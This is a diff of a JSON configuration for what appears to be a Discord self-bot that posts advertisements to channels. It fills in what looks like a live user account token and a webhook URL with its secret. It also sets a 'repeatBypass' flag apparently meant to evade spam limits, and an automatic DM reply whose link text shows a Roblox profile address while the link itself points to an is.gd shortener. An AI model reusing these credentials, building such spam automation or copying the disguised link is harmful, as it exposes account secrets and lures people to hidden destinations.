@@ -1,12 +1,12 @@
 {
-    "token": "",
+    "token": "ODU3MDU2NzcwNzU2NTc1MjMy.GEp7Mj.pg50S9USUUlH6IebUMtydlJJ41ihYjO9lfk-M0",
     "message": "# **Trading perms and gamepass**",
-    "channels": "",
-    "delay": "",
-    "status": "",
+    "channels": ["1214285577579397140", "1214285675818520666", "1200797743652798552", "1106952979627638794", "1193717379209904348"],
+    "delay": "150",
+    "status": "online",
     "customStatus": "",
-    "dmResponse": "",
-    "webhook": "",
-    "webhookPing": "https://discord.com/api/webhooks/1256761731774943273/fKBUaiAaJO0EAXSZW_WAvtmTxEUn-W4hABxgoftvTOT-uusyGuCD0wvcC1ZgVf5HkJzN",
-    "repeatBypass": ""
+    "dmResponse": "I am in a game rn so join off of me [https//www.roblox.com/users/6826241011/profile](https://is.gd/AUM9xS)",
+    "webhook": "https://discord.com/api/webhooks/1256761731774943273/fKBUaiAaJO0EAXSZW_WAvtmTxEUn-W4hABxgoftvTOT-uusyGuCD0wvcC1ZgVf5HkJzN",
+    "webhookPing": "",
+    "repeatBypass": "y"
 }
